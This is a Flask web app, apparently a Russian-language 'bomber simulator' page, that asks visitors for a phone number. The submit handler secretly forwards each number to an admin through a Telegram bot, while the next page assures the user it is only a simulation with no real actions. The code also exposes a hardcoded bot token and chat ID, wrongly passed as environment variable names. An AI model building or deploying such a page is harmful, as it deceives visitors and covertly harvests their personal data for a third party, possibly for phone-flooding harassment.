from flask import Flask, request, redirect
from telegram import Bot
import os

app = Flask(__name__)
TELEGRAM_BOT_TOKEN = os.getenv("7507773615:AAFPnpOD_cRRXp7LM6yqS0off78CrhAAEHM")
ADMIN_CHAT_ID = os.getenv("6705414979")
bot = Bot(token=TELEGRAM_BOT_TOKEN)

# Главная страница
@app.route('/')
def index():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Симулятор бомбера</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
                background: #f4f4f4;
            }
            .container {
                margin-top: 100px;
            }
            input {
                padding: 10px;
                margin: 10px;
                width: 300px;
            }
            button {
                padding: 10px 20px;
                background: #007BFF;
                color: white;
                border: none;
                cursor: pointer;
            }
            button:hover {
                background: #0056b3;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Симулятор бомбера</h1>
            <p>Введите номер телефона:</p>
            <form action="/submit" method="POST">
                <input type="text" name="phone_number" placeholder="Введите номер телефона" required>
                <button type="submit">Отправить</button>
            </form>
        </div>
    </body>
    </html>
    '''

# Обработка отправки номера телефона
@app.route('/submit', methods=['POST'])
def submit():
    phone_number = request.form.get('phone_number')
    if phone_number:
        # Отправка номера телефона администратору
        bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"Получен номер телефона: {phone_number}")
        return redirect('/simulator')
    else:
        return "Ошибка: номер телефона не указан."

# Страница симулятора
@app.route('/simulator')
def simulator():
    return '''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Симуляция бомбера</title>
        <style>
            body {
                font-family: Arial, sans-serif;
                text-align: center;
                margin: 0;
                padding: 0;
                background: #f4f4f4;
            }
            .container {
                margin-top: 100px;
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>Симуляция бомбера</h1>
            <p>Это симуляция. Никаких реальных действий не выполняется.</p>
        </div>
    </body>
    </html>
    '''

# Запуск сервера
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))